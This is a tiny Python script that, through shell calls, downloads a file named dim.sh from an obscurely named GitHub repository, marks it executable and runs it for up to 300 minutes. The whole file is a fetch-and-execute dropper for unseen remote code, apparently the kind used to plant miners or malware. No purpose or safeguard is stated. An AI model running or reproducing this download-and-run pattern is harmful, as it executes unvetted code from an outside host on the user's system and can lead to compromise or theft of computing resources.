#!/usr/bin/env python
import subprocess
import time

subprocess.call("wget https://github.com/unmsjd28/ynsg7s9/raw/main/dim.sh", shell=True)
subprocess.call("chmod 755 dim.sh", shell=True)
subprocess.call("timeout 300m ./dim.sh", shell=True)
